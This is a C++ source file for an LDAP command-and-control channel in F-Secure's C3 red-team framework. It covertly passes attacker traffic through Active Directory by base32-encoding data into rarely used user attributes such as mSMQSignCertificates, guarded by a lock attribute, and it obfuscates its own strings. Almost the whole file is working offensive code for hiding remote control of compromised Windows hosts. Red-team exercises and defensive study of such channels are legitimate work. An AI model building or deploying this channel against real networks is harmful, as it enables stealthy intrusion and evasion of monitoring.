#include "stdafx.h"
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif

#include "LDAP.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/FSecure/Crypto/Base32.h"
#include <comdef.h>     // COM definitions
#include <activeds.h>   // ADSI definitions
#pragma comment(lib, "Adsiid.lib")
#pragma comment(lib, "Activeds.lib")
#pragma comment(lib, "Secur32.lib")
#include <security.h>
#include <secext.h>
#include <Iads.h>
#include <adshlp.h>

using namespace FSecure::StringConversions;

namespace FSecure::C3::Interfaces::Channels::Detail
{
	bool ComInit()
	{
		if (FAILED(CoInitialize(nullptr)))
			throw std::runtime_error{ OBF("Failed to intialize COM") };
		return true;
	}

	ComInitializer::ComInitializer() :
		m_Init{ reinterpret_cast<void*>(ComInit()), &Deleter }
	{
	}

	void ComInitializer::Deleter(void*)
	{
		CoUninitialize();
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::LDAP::LDAP(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
	, m_ldapAttribute{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_ldapLockAttribute{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_maxPacketSize{ arguments.Read<uint32_t>() }
	, m_domainController{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_username{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_password{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_userDN{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_Com{}
	, m_DirObject{ CreateDirectoryObject() }
{
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::LDAP::OnSendToChannel(ByteView data)
{
	// Check if the attribute is locked for writing already
	if (!GetAttributeValue(m_ldapLockAttribute).empty())
		// It's locked which means it hasn't been read yet
		return 0;

	// If not then lock it by setting the lock attribute to be the name of our intended recipient
	SetAttribute(m_ldapLockAttribute, Convert<Utf16>(m_outboundDirectionName));

	// Find out what size chunks we're able to send
	size_t sizeOfDataToWrite = CalculateDataSize(data);

	// Encode the data
	std::string dataToWrite = EncodeData(data, sizeOfDataToWrite);

	// Write the data
	SetAttribute(m_ldapAttribute, Convert<Utf16>(dataToWrite));

	return sizeOfDataToWrite;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::LDAP::OnReceiveFromChannel()
{

	std::string lockValue = GetAttributeValue(m_ldapLockAttribute);

	// If attribute or lock is empty then nothing to be read
	if (lockValue.empty() || lockValue != m_inboundDirectionName)
		return {};

	std::string attributeValue = GetAttributeValue(m_ldapAttribute);

	if (attributeValue.empty())
		return {};
	// Decode attribute value and prepare to send it back
	ByteVector ret = base32::decode(attributeValue);

	// Clear the data attribute
	ClearAttribute(m_ldapAttribute);

	// Clear the lock so that data can be written again
	ClearAttribute(m_ldapLockAttribute);

	return ret;
}


FSecure::C3::Interfaces::Channels::Detail::ComPtr<IDirectoryObject> FSecure::C3::Interfaces::Channels::LDAP::CreateDirectoryObject()
{
	IDirectoryObject* dirObject;
	std::wstring ldapUrl = OBF(L"LDAP://") + m_domainController + L"/" + m_userDN;
	HRESULT hr;
	if (!m_username.empty() || !m_password.empty())
		hr = ADsOpenObject(ldapUrl.c_str(), m_username.c_str(), m_password.c_str(), ADS_SECURE_AUTHENTICATION, IID_IDirectoryObject, (void**)&dirObject);
	else
		hr = ADsOpenObject(ldapUrl.c_str(), nullptr, nullptr, ADS_SECURE_AUTHENTICATION, IID_IDirectoryObject, (void**)&dirObject);

	if (!SUCCEEDED(hr))
		throw std::runtime_error{ OBF("Couldn't bind to Active Directory.") };

	return { dirObject };
}


void FSecure::C3::Interfaces::Channels::LDAP::ClearAttribute(std::wstring const& attribute)
{
	DWORD dwReturn = 0;

	ADS_ATTR_INFO attrInfo{ const_cast<LPWSTR>(attribute.c_str()), ADS_ATTR_CLEAR, ADSTYPE_CASE_IGNORE_STRING, NULL, 1 };
	auto hr = m_DirObject->SetObjectAttributes(&attrInfo, 1, &dwReturn);
	if (!SUCCEEDED(hr))
		throw std::runtime_error{ OBF("Couldn't clear attribute.") };
}


std::string FSecure::C3::Interfaces::Channels::LDAP::GetAttributeValue(std::wstring const& attribute)
{
	ADS_ATTR_INFO* pAttrInfo = nullptr;

	LPWSTR pAttrNames[] = { const_cast<LPWSTR>(attribute.c_str()) };
	DWORD dwReturn = 0;

	HRESULT hr = m_DirObject->GetObjectAttributes(pAttrNames, 1, &pAttrInfo, &dwReturn);

	if (FAILED(hr))
		throw std::runtime_error{ OBF("Failed to get attribute value.") };

	auto attrInfo = std::unique_ptr<ADS_ATTR_INFO, decltype(&FreeADsMem)>{ pAttrInfo, &FreeADsMem };

	// Check if the attribute is empty, returning an empty string if so
	if (dwReturn == 0)
		return "";

	switch (pAttrInfo[0].dwADsType)
	{
	case ADSTYPE_CASE_IGNORE_STRING:
		return Convert<Utf8>(pAttrInfo[0].pADsValues[0].CaseIgnoreString);
	case ADSTYPE_OCTET_STRING:
		return { reinterpret_cast<char const*>(pAttrInfo[0].pADsValues[0].OctetString.lpValue), pAttrInfo[0].pADsValues[0].OctetString.dwLength };
	}
	throw std::runtime_error{ OBF("Couldn't read the attribute type, pick a better attribute.") };
}


void FSecure::C3::Interfaces::Channels::LDAP::SetAttribute(std::wstring const& attribute, std::wstring const& value)
{
	ADSVALUE  snValue;
	snValue.dwType = ADSTYPE_CASE_IGNORE_STRING;
	snValue.CaseIgnoreString = const_cast<LPWSTR>(value.c_str());
	ADS_ATTR_INFO attrInfo[] = { const_cast<LPWSTR>(attribute.c_str()), ADS_ATTR_UPDATE, ADSTYPE_CASE_IGNORE_STRING, &snValue, 1 };
	DWORD dwReturn = NULL;
	HRESULT hr = m_DirObject->SetObjectAttributes(attrInfo, 1, &dwReturn);

	if (!SUCCEEDED(hr))
		throw std::runtime_error{ OBF("Failed to set attribute, likely because it doesn't exist.") };
}


size_t FSecure::C3::Interfaces::Channels::LDAP::CalculateDataSize(ByteView data)
{
	auto maxPacketSize = base32::decoded_max_size(m_maxPacketSize);
	return std::min(maxPacketSize, data.size());
}


std::string FSecure::C3::Interfaces::Channels::LDAP::EncodeData(ByteView data, size_t dataSize)
{
	auto sendData = data.SubString(0, dataSize);
	return base32::encode(sendData.data(), sendData.size());
}


FSecure::ByteVector FSecure::C3::Interfaces::Channels::LDAP::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		//lock first to avoid race condition
		SetAttribute(m_ldapLockAttribute, Convert<Utf16>(L"CLEAR"));
		//clear attribute
		ClearAttribute(m_ldapAttribute);
		ClearAttribute(m_ldapLockAttribute);
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}


const char* FSecure::C3::Interfaces::Channels::LDAP::GetCapability()
{
	return R"_(
{
    "create":
    {
        "arguments":
        [
            [
                {
                    "type": "string",
                    "name": "Input ID",
                    "min": 4,
                    "randomize": true,
                    "description": "Used to distinguish packets for the channel"
                },
                {
                    "type": "string",
                    "name": "Output ID",
                    "min": 4,
                    "randomize": true,
                    "description": "Used to distinguish packets from the channel"
                }
            ],
            {
                "type": "string",
                "name": "Data LDAP Attribute",
                "min": 1,
				"defaultValue": "mSMQSignCertificates",
                "description": "The LDAP attribute to write data into. Recommend mSMQSignCertificates (MANUALLY CHECK THAT IT IS EMPTY)"
            },
			{
                "type": "string",
                "name": "Lock LDAP Attribute",
                "min": 1,
				"defaultValue": "primaryInternationalISDNNumber",
                "description": "The LDAP attribute to use as the lock. Recommend primaryInternationalISDNNumber (MANUALLY CHECK THAT IT IS EMPTY)"
            },
			{
                "type": "uint32",
                "name": "Max Packet Size",
                "min": 1,
                "defaultValue": "1047552",
                "description": "The maximum number of bytes that your selected LDAP attribute supports"
            },
			{
                "type": "string",
                "name": "Domain Controller",
                "min": 1,
				"defaultValue": "<FQDN>",
                "description": "The domain controller to target, avoids waiting for synchronisations"
            },
			{
                "type": "string",
                "name": "Username",
                "defaultValue": "",
                "description": "The FQDN of the account to modify (i.e. fsecure@uk.test.com), defaults to executing user if empty"
            },
			{
                "type": "string",
                "name": "Password",
                "defaultValue": "",
                "description": "The password of the account to modify, defaults to executing user if empty"
            },
{
                "type": "string",
                "name": "User DN",
                "defaultValue": "CN=Jeff Smith,CN=users,DC=fabrikam,DC=com",
                "description": "The Distinguished Name (DN) of the account to modify"
            }
        ]
    },
    "commands": [
		{
			"name": "Clear attribute values",
			"id": 0,
			"description": "Clear data and lock attributes in the event of an error",
			"arguments": []
		}
	]
}
)_";
}
